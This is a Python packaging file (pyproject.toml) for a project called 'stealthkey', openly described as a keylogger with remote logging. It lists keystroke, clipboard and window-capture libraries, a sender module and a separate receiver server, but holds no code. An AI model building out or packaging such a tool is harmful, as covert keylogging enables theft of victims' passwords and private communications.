[build-system]
requires = ["setuptools>=61.0"]
build-backend = "setuptools.build_meta"

[project]
name = "stealthkey"
version = "1.0.0"
description = "A sophisticated keylogger with NLP-based spell correction and remote logging."
dependencies = [
    "pynput",
    "pyperclip",
    "requests",
    "nltk",
    "flask",
    "pygetwindow"
]
requires-python = ">=3.10"

[project.scripts]
stealthkey = "main:main"
stealthkey-receiver = "receiver:start_receiver"

[tool.setuptools]
py-modules = ["main", "stealthkey", "spell_corrector", "log_creator", "sender", "receiver", "text_cleaner"]